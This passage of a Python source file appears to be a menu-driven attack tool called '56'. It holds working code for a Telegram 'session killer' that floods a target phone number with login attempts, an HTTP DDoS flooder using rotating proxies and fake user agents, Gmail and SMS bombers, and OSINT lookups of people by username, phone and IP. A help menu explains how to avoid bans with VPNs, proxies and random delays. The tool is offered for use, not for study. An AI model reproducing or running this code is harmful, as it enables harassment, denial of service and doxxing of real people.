                    wait = fwe.seconds + random.randint(5, 15)
                    print(f"{Fore.RED}[{session_name}] Flood control: wait {wait} sec | Acc: {account['name']}{Style.RESET_ALL}")
                    time.sleep(wait)
                except Exception as e:
                    print(f"{Fore.RED}[{session_name}] Error: {type(e).__name__} - {e}{Style.RESET_ALL}")
                    try:
                        await client.disconnect()
                    except:
                        pass
                    await client.connect()
                    if not client.is_connected():
                        print(f"{Fore.RED}[{session_name}] Reconnect failed! Skipping thread.")
                        break
                
                # Случайная задержка
                delay = random.uniform(delay_range[0], delay_range[1])
                time.sleep(delay)
            else:
                print(f"{Fore.YELLOW}[{session_name}] Attempts exhausted{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[{session_name}] Already authorized{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[{session_name}] FATAL ERROR: {type(e).__name__} - {e}{Style.RESET_ALL}")
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except:
            pass
        print(f"{Fore.YELLOW}[{session_name}] Session closed{Style.RESET_ALL}")

def start_telegram_attack(phone_number, threads_count, max_attempts, delay_range):
    if not PROXIES_LIST:
        print(f"{Fore.RED}WARNING: No proxies loaded! Attacks may fail{Style.RESET_ALL}")
        if input("Continue without proxies? (y/n): ").lower() != 'y':
            return []
            
    if not TELEGRAM_ACCOUNTS:
        print(f"{Fore.RED}Error: No Telegram accounts available!{Style.RESET_ALL}")
        return []
    
    print(f"{Fore.RED}\n⚡ ACTIVATING SESSION KILLER ⚡")
    print(f"Target: {phone_number}")
    print(f"Threads: {threads_count}")
    print(f"Attempts per thread: {max_attempts}")
    print(f"Delay: {delay_range[0]}-{delay_range[1]} sec")
    print(f"{Fore.CYAN}Using {len(TELEGRAM_ACCOUNTS)} accounts{Style.RESET_ALL}")
    
    threads = []
    
    for i in range(threads_count):
        session_name = f'session_{i}_{int(time.time())}'
        account = get_random_account()
        
        if not account:
            print(f"{Fore.RED}No account available for thread {i}{Style.RESET_ALL}")
            continue
            
        thread = threading.Thread(
            target=run_async_task,
            args=(telegram_login_worker, session_name, phone_number, max_attempts, delay_range, account),
            daemon=True
        )
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.1, 0.5))
        
    print(f"{Fore.YELLOW}\nLaunched {len(threads)} attack threads{Style.RESET_ALL}")
    return threads

def run_async_task(async_func, *args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(async_func(*args))
    except Exception as e:
        print(f"{Fore.RED}Async task error: {e}{Style.RESET_ALL}")
    finally:
        loop.close()

################################################################################################

#DDOS

################################################################################################


def DDostask(ddtarget, ddmin, ddmax, task_id, proxy_dict=None):
    try:
        # Generate random headers
        user_agent = fake_useragent.UserAgent().random
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        # Random HTTP method
        methods = ['GET', 'POST']
        method = random.choice(methods)
        
        # Execute request
        start_time = time.time()
        if method == 'GET':
            response = requests.get(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
        elif method == 'POST':
            response = requests.post(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
        
        delay = random.uniform(ddmin, ddmax)
        time.sleep(delay)
        
        print(f"Task {task_id}: {method} {ddtarget} -> {response.status_code} in {time.time()-start_time:.2f}s")
    
    except Exception as e:
        print(f"Task {task_id}: Error - {str(e)}")




async def DDos(task_id, semaphore, ddtarget, ddmin, ddmax):
    proxy_dict = get_random_proxy()
    async with semaphore:
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, DDostask, ddtarget, ddmin, ddmax, task_id, proxy_dict)








################################################################################################


async def main():
    logo = """
 ▄▄▄       ▄▄▄▄     ██████  ▒█████  ▄▄▄█████▓ ██▀███  ▓██   ██▓
▒████▄    ▓█████▄ ▒██    ▒ ▒██▒  ██▒▓  ██▒ ▓▒▓██ ▒ ██▒ ▒██  ██▒
▒██  ▀█▄  ▒██▒ ▄██░ ▓██▄   ▒██░  ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒  ▒██ ██░
░██▄▄▄▄██ ▒██░█▀    ▒   ██▒▒██   ██░░ ▓██▓ ░ ▒██▀▀█▄    ░ ▐██▓░
 ▓█   ▓██▒░▓█  ▀█▓▒██████▒▒░ ████▓▒░  ▒██▒ ░ ░██▓ ▒██▒  ░ ██▒▓░
 ▒▒   ▓▒█░░▒▓███▀▒▒ ▒▓▒ ▒ ░░ ▒░▒░▒░   ▒ ░░   ░ ▒▓ ░▒▓░   ██▒▒▒ 
  ▒   ▒▒ ░▒░▒   ░ ░ ░▒  ░ ░  ░ ▒ ▒░     ░      ░▒ ░ ▒░ ▓██ ░▒░ 
  ░   ▒    ░    ░ ░  ░  ░  ░ ░ ░ ▒    ░        ░░   ░  ▒ ▒ ░░  
      ░  ░ ░            ░      ░ ░              ░      ░ ░     
                ░                                      ░ ░     
    """
    print(Fore.WHITE + logo)
    print(Fore.WHITE + "\nhttps://github.com/absotry/56\n")
    
    if input(Fore.WHITE + "TYPE 56 TO CONTINUE\n> ") != "56":
        return
    clear_console()
    
    # Default settings
    ddtarget = None
    ddattempts = None
    ddmin = None
    ddmax = None
    ddthread = None
    proxies56 = None
    vkTOKEN = None
    VKvers = "5.199"
    TGnumber = None
    tg_accounts_file = "tg_accounts.ini"
    youtube_api_key = None
    faceitapi = None
    getcontactapi = None
    NumVerifyAPI = None
    breachapi = None
    bomberyourgmail = None
    bombertargetgmail = None
    bomberapppassword = None
    bombertext = None
    bomberamount = None
    bombersubject = None
    phoneby56 = None
    TGgroup = None
    PROXIES_LOADED = False
    BOMBER_CONFIG = None
    TrueCallerAPI = None
    DDthreads = []
    
    # Telegram attack parameters
    MAX_ATTEMPTS = 5
    DELAY_RANGE = (5, 10)
    THREADS_COUNT = 8

    # Create sessions directory
    os.makedirs("sessions", exist_ok=True)

    while True:
        time.sleep(0.3)
        print(Fore.WHITE + logo)

        choice = input(Fore.WHITE + 
            "\n" + "="*50 + 
            "\nMAIN MENU\n" +
            "="*50 +
            "\n1. OSINT Tools\n" +
            "2. API Configuration\n" +
            "3. Proxy Setup\n" +
            "4. Bomber Module\n" +
            "5. Telegram Operations\n" +
            "6. DDos\n"
            "7. Helps\n" +
            "8. Exit Program\n" +
            "="*50 +
            "\nEnter choice: "
        )

        if choice == "1":
            clear_console()
            print(Fore.WHITE + logo)
            osint56 = input(Fore.WHITE + 
                "\n" + "-"*50 +
                "\nOSINT TOOLS\n" +
                "-"*50 +
                "\n1. Username Search\n" +
                "2. Phone Number Lookup\n" +
                "3. Email Investigation\n" +
                "4. IP Analysis\n" +
                "-"*50 +
                "\nSelect option: "
            )
            if osint56 == "1":
                clear_console()
                print(Fore.WHITE + logo)
                username = input(Fore.WHITE + "\nEnter username: ").strip()
                if not username:
                    clear_console()
                    print(Fore.WHITE + logo)
                    print(f"{Fore.RED}\nERROR: Username cannot be empty")
                    continue
                    
                proxy_dict = None
                if get_random_proxy():
                    print(f"{Fore.CYAN}\n{'-'*50}")
                    print(f"PROXY VERIFICATION")
                    print(f"{'-'*50}{Style.RESET_ALL}")
                    proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
                else:
                    print(f"{Fore.RED}Proxy configuration error")
                
                if vkTOKEN:
                    VK_search(username, vkTOKEN, VKvers, proxy_dict)
                else:
                    print(f"{Fore.YELLOW}VK token not configured. Skipping VK search.")

                search_220vk(username, proxy_dict)
                search_tiktok(username, proxy_dict)
                search_steam(username, proxy_dict)
                search_telegram(username, proxy_dict)
                search_youtube(username, youtube_api_key, proxy_dict)
                search_twitch(username, proxy_dict)
                search_github(username, proxy_dict)
                search_x(username, proxy_dict)
                search_faceit(username, faceitapi, proxy_dict)
                search_reddit(username, proxy_dict)
                ipeekyou(username, proxy_dict)
            
            elif osint56 == "2":
                clear_console()
                print(Fore.WHITE + logo)
                number = input(Fore.WHITE + "\nEnter phone number: ")
                proxy_dict = None
                if get_random_proxy():
                    print(f"{Fore.CYAN}\n{'-'*50}")
                    print(f"PROXY VERIFICATION")
                    print(f"{'-'*50}{Style.RESET_ALL}")
                    proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
                else:
                    clear_console()
                    print(Fore.WHITE + logo)
                    print(f"{Fore.RED}\nProxy configuration error")

                search_numverify(number, NumVerifyAPI, proxy_dict)
                phonenumbers_search(number)
                truecaller_search(number, TrueCallerAPI, proxy_dict)

            elif osint56 =="3":
                clear_console()
                print(Fore.WHITE + logo)
                email = input(Fore.WHITE + "\nFeature in development\nEnter email: ")
                if get_random_proxy():
                    print(f"{Fore.CYAN}\n{'-'*50}")
                    print(f"PROXY VERIFICATION")
                    print(f"{'-'*50}{Style.RESET_ALL}")
                    proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
                else:
                    clear_console()
                    print(Fore.WHITE + logo)
                    print(f"{Fore.RED}\nProxy configuration error")

            elif osint56 =="4":
                clear_console()
                print(Fore.WHITE + logo)
                ipby56 = input(Fore.WHITE + "\nEnter IP address: ")
                proxy_dict = None
                if get_random_proxy():
                    print(f"{Fore.CYAN}\n{'-'*50}")
                    print(f"PROXY VERIFICATION")
                    print(f"{'-'*50}{Style.RESET_ALL}")
                    proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
                else:
                    clear_console()
                    print(Fore.WHITE + logo)
                    print(f"{Fore.RED}Proxy configuration error")
                ip_search(ipby56, proxy_dict)
                iknowwd(ipby56, proxy_dict)
                spys(ipby56, proxy_dict)
                check_host(ipby56, proxy_dict)
        

        elif choice == "2":
            clear_console()
            print(Fore.WHITE + logo)
            APIchoose = input(Fore.WHITE + 
                "\n" + "-"*50 +
                "\nAPI CONFIGURATION\n" +
                "-"*50 +
                "\n1. VK API\n" +
                "2. Telegram API\n" +
                "3. YouTube API\n" +
                "4. FACEIT API\n" +
                "5. GetContact API\n" +
                "6. Numverify API\n" +
                "7. TrueCaller API\n" +
                "-"*50 +
                "\nSelect API: "
            )
            if APIchoose == "1":
                clear_console()
                print(Fore.WHITE + logo)
                vkTOKEN = input(Fore.WHITE  + "\nEnter VK API token: ").strip()
                print(f"{Fore.GREEN}\nSUCCESS: VK token configured")
            elif APIchoose == "2":
                clear_console()
                print(Fore.WHITE + logo)
                tgapivibor = input(Fore.WHITE  + 
                    "\n" + "-"*50 +
                    "\nTELEGRAM CONFIGURATION\n" +
                    "-"*50 +
                    "\n1. API ID\n" +
                    "2. API HASH\n" +
                    "3. Phone Number\n" +
                    "4. Back to API Menu\n" +
                    "-"*50 +
                    "\nSelect option: "
                )
                if tgapivibor == "1":
                    clear_console()
                    print(Fore.WHITE + logo)
                    tg_apiapp = input(Fore.WHITE  + "\nEnter Telegram API ID: ")
                elif tgapivibor == "2":
                    clear_console()
                    print(Fore.WHITE + logo)
                    tg_apihash = input(Fore.WHITE  + "\nEnter Telegram API HASH: ")
                elif tgapivibor == "3":
                    clear_console()
                    print(Fore.WHITE + logo)
                    TGnumber = input(Fore.WHITE  + "\nEnter Telegram phone number: ")
                else:
                    clear_console()
                    print(Fore.WHITE + logo)
                    print(f"{Fore.YELLOW}\nReturning to API menu")
            elif APIchoose == "3":
                clear_console()
                print(Fore.WHITE + logo)
                youtube_api_key = input(Fore.WHITE  + "\nEnter YouTube API key: ").strip()
                print(f"{Fore.GREEN}\nSUCCESS: YouTube API configured")
            elif APIchoose == "4":
                clear_console()
                print(Fore.WHITE + logo)
                faceitapi = input(Fore.WHITE + "\nEnter FACEIT API key: ")
                print(f"{Fore.GREEN}\nSUCCESS: FACEIT API configured")
            elif APIchoose == "5":
                clear_console()
                print(Fore.WHITE + logo)
                getcontactapi = input(Fore.WHITE + "\nEnter GetContact API key: ")
                print(f"{Fore.GREEN}\nSUCCESS: GetContact API configured")
            elif APIchoose == "6":
                clear_console()
                print(Fore.WHITE + logo)
                NumVerifyAPI = input(Fore.WHITE + "\nEnter Numverify API key: ")
                print(f"{Fore.GREEN}\nSUCCESS: Numverify API configured")
            elif APIchoose == '7':
                clear_console()
                print(Fore.WHITE + logo)
                TrueCallerAPI = input(Fore.WHITE  + '\nEnter TrueCaller API key: ')
                print(f"{Fore.GREEN}\nSUCCESS: TrueCaller API configured")
            else:
                clear_console()
                print(Fore.WHITE + logo)
                print(f"{Fore.RED}\nERROR: Invalid selection")
                

        elif choice == "3":
            clear_console()
            print(Fore.WHITE + logo)
            proxy_choice = input(Fore.WHITE + 
                "\n" + "-"*50 +
                "\nPROXY SETUP\n" +
                "-"*50 +
                "\n1. Load proxies from INI\n" +
                "2. Validate proxies from JSON\n" +
                "-"*50 +
                "\nSelect option: "
            )
            
            if proxy_choice == "1":
                proxy_file = input("\nEnter path to proxy configuration file: ")
                if load_proxies(proxy_file):
                    print(f"{Fore.GREEN}Proxies loaded successfully!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Failed to load proxies{Style.RESET_ALL}")
                    
            elif proxy_choice == "2":
                json_path = input("\nEnter path to JSON file with proxies: ")
                output_ini = input("Enter output INI file name (default: proxycfg.ini): ") or "proxycfg.ini"
                validate_proxies_from_json(json_path, output_ini)
        

        elif choice == "4":
            clear_console()
            print(Fore.WHITE + logo)
            bomber_type = input(Fore.WHITE + 
                "\n" + "-"*50 +
                "\nBOMBER MODULE\n" +
                "-"*50 +
                "\n1. Gmail Bomber\n" +
                "2. SMS Bomber\n" +
                "-"*50 +
                "\nSelect option: "
            )
            
            if bomber_type == "1":
                clear_console()
                print(Fore.WHITE + logo)
                config_file = input(Fore.WHITE + "\nEnter path to bomber configuration file: ")
                BOMBER_CONFIG = load_bomber_config(config_file)
                
                if BOMBER_CONFIG:
                    print(f"{Fore.CYAN}\nStarting Gmail bomber...")
                    start_gmail_bomber(BOMBER_CONFIG)
                else:
                    print(f"{Fore.RED}\nERROR: Invalid bomber configuration")

            elif bomber_type == "2":
                clear_console()
                print(Fore.WHITE + logo)
                chooser = input(Fore.WHITE + 
                    "\n" + "-"*50 +
                    "\nSMS BOMBER\n" +
                    "-"*50 +
                    "\n1. Set Target Number\n" +
                    "2. Start SMS Attack\n" +
                    "-"*50 +
                    "\nSelect option: "
                )
                if chooser == "1":
                    clear_console()
                    print(Fore.WHITE + logo)
                    phoneby56 = input(Fore.WHITE + "\nEnter target phone number: ")
                    print(f"{Fore.GREEN}\nTarget number set")
                elif chooser == "2":
                    if not phoneby56:
                        print(f"{Fore.RED}\nERROR: No target number configured")
                    else:
                        print(f"{Fore.CYAN}\nInitiating SMS bombardment...")
                        smsbomber(phoneby56)
            

        elif choice == "5":
            clear_console()
            print(Fore.WHITE + logo)
            telegramvibor = input(Fore.WHITE + 
                "\n" + "="*50 +
                f"\nTELEGRAM OPERATIONS (Threads: {THREADS_COUNT}, Attempts: {MAX_ATTEMPTS})" +
                "\n" + "="*50 +
                "\n1. Load Telegram Accounts\n" +
                "2. Set Target Phone Number\n" +
                "3. Set Max Attempts\n" +
                "4. Set Delay Range\n" +
                "5. Set Thread Count\n" +
                "6. Start Session Killer\n" +
                "7. Back to Main Menu\n" +
                "-"*50 +
                "\nEnter choice: "
            )
            
            if telegramvibor == "1":
                clear_console()
                print(Fore.WHITE + logo)
                file_path = input(Fore.WHITE + "\nEnter path to accounts file: ") or "tg_accounts.ini"
                if load_telegram_accounts(file_path):
                    print(f"{Fore.GREEN}\nSUCCESS: Accounts loaded")
                else:
                    if input(f"{Fore.YELLOW}\nCreate sample config? (y/n): ").lower() == "y":
                        save_accounts_config(file_path)
                        print(f"{Fore.GREEN}\nSample config created")
            elif telegramvibor == "2":
                clear_console()
                print(Fore.WHITE + logo)
                TGnumber = input(Fore.WHITE + "\nEnter target phone number (+XX...): ")
                print(f"{Fore.GREEN}\nTarget number set")
            elif telegramvibor == "3":
                clear_console()
                print(Fore.WHITE + logo)
                try:
                    MAX_ATTEMPTS = int(input("\nEnter max attempts per thread: "))
                    print(f"{Fore.GREEN}\nMax attempts set to {MAX_ATTEMPTS}")
                except ValueError:
                    print(f"{Fore.RED}\nERROR: Invalid number format")
            elif telegramvibor == "4":
                clear_console()
                print(Fore.WHITE + logo)
                try:
                    min_delay = float(input("\nEnter minimum delay (seconds): "))
                    max_delay = float(input("Enter maximum delay (seconds): "))
                    if min_delay < 1 or max_delay < min_delay:
                        raise ValueError
                    DELAY_RANGE = (min_delay, max_delay)
                    print(f"{Fore.GREEN}\nDelay range set to {min_delay}-{max_delay} seconds")
                except ValueError:
                    print(f"{Fore.RED}\nERROR: Invalid delay values")
            elif telegramvibor == "5":
                clear_console()
                print(Fore.WHITE + logo)
                try:
                    THREADS_COUNT = int(input("\nEnter thread count (1-200): "))
                    if THREADS_COUNT < 1 or THREADS_COUNT > 200:
                        raise ValueError
                    print(f"{Fore.GREEN}\nThread count set to {THREADS_COUNT}")
                except ValueError:
                    print(f"{Fore.RED}\nERROR: Invalid thread count")
            elif telegramvibor == "6":
                clear_console()
                print(Fore.WHITE + logo)
                if not TELEGRAM_ACCOUNTS:
                    print(f"{Fore.RED}\nERROR: No Telegram accounts loaded")
                    continue
                if not TGnumber:
                    print(f"{Fore.RED}\nERROR: Target number not configured")
                    continue
                    
                print(f"{Fore.CYAN}\nStarting session killer attack...")
                attack_threads = start_telegram_attack(
                    TGnumber,
                    THREADS_COUNT,
                    MAX_ATTEMPTS,
                    DELAY_RANGE
                )
                
                for t in attack_threads:
                    t.join()
                    
                print(f"{Fore.GREEN}\nATTACK COMPLETED: All sessions terminated")
            elif telegramvibor == "7":
                continue
            else:
                print(f"{Fore.RED}\nERROR: Invalid selection")

        elif choice == '6':
            clear_console()
            print(Fore.WHITE + logo)
            ddtarget = input('Target:\n>  ')
            clear_console()
            print(Fore.WHITE + logo)
            ddattempts = int(input('Attempts\n>  '))
            clear_console()
            print(Fore.WHITE + logo)
            ddthread = int(input('Threads\n>  '))
            clear_console()
            print(Fore.WHITE + logo)
            ddmin = int(input('Min delay:\n>  '))
            clear_console()
            print(Fore.WHITE + logo)
            ddmax = int(input('Max delay:\n>  '))
            clear_console()
            print(Fore.WHITE + logo)
            semaphore = asyncio.Semaphore(ddthread)
            tasks = []
            for i in range(ddattempts):
                task_obj = asyncio.create_task(DDos(i, semaphore, ddtarget, ddmin, ddmax))
                tasks.append(task_obj)
            await asyncio.gather(*tasks)
            print('DDos attact completed')







            

        elif choice == "7":
            clear_console()
            print(Fore.WHITE + logo)
            print("Contact with me\nTelegram: @absotry\nEmail: 5656@tutamail.com\n")
            print("Version: 0.5")
            helpme56 = input(
                "\n============================\n"
                "HELP MENU:\n" 
                '============================\n'

                "\n1. Help me with CFG\n" 
                "2. For what i can get ban?\n\n"
                '============================\n\n'


                ">  "
                )
            if helpme56 == "1":
                clear_console()
                print(Fore.WHITE + logo)
                CFGhelp = '''\n
You need create CFG for

1. GMAILBOMBER
2. Proxy
3. Telegram session killer

you can change name file for all CFG

Format for GmailBomber:
File format file.ini

CFG format:

[Bomber]
Subject = 56
Message = 56
AmountPerAccount = 3

[Targets]
target1 = 56@gmail.com, 565@gmail.com...

[Account1]
Email = 56project@gmail.com
AppPassword = 5656 5656 5656 5656

For AppPassword you need enable Double Auth.
https://myaccount.google.com/apppasswords


Format for Telegram:
File format file.ini

You need create app for telegram
https://my.telegram.org/auth?to=apps

CFG format:




[TelegramAccount1]
Name = @botnetuser
API_ID = 56565656
API_HASH = qwertyqwertyqwertyqwertyqwertyqwe

[TelegramAccount2]
Name = @botnet56
API_ID = 56565650
API_HASH = qwertyqwertyqwertyqwertyqwertyq56

Proxies format
file: file.ini

CFG format

[Proxy1]
name = "USA"
url = "socks4://31.42.185.134:1080"

[Proxy2]
name = "Europe HTTP"
url = "http://45.67.215.68:80"

[Proxy3]
name = "Asia HTTPS"
url = "http://45.8.211.33:80"

[Proxy4]
name = "USA"
url = "http://185.221.160.2:80"


In feature will added support with tor-bridge


I SO RECOMMEND USE VPN, BECOUSE PROXY CONNECTION CAN FAILED

'''
                print(CFGhelp)
                input("Type anothing to continue...\n>  ")
                clear_console()

            elif helpme56 == "2":
                clear_console()
                print(Fore.WHITE + logo)
                HelpCanIgetBan = '''
For what i  can het ban?

1. For abuse parsing for your own ip (IP BAN)

2. For abuse session killer without proxy and with identical delay.
after +- 7 attempts accounts get spamm ban. First ban - 24hours (IPban, device ban, account ban)

3. For abuse gmailbomber

4. For DDos

For get smaller chanse for ban

1. Use VPN + ProxyCFG (56 auto take random proxy, but sometimes can be errors)

2. Use random delay
''' 
                print(HelpCanIgetBan)
                input("Type anothing...\n>  ")
                clear_console()
            else:
                None
                
        elif choice == "8":
            clear_console()
            print(Fore.WHITE + logo)
            print(f"{Fore.CYAN}\nExiting program...")
            break

        else:
            clear_console()
            print(Fore.WHITE + logo)
            print(f"{Fore.RED}\nERROR: Invalid menu selection")

if __name__ == '__main__':
    asyncio.run(main())
